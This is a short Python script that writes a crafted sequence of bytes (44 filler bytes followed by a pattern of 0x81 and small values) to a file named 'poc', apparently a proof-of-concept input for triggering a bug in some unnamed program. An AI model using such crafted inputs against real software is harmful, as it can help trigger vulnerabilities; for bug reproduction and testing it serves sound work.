poc = []
for i in range(44):
    poc.append(1)

in_ = [0x81, 0x4, 0x81, 0x1, 0x81, 0x81, 0x81, 0x1]

poc.extend(in_)

with open("./poc", "wb") as file:
    file.write(bytes(poc))
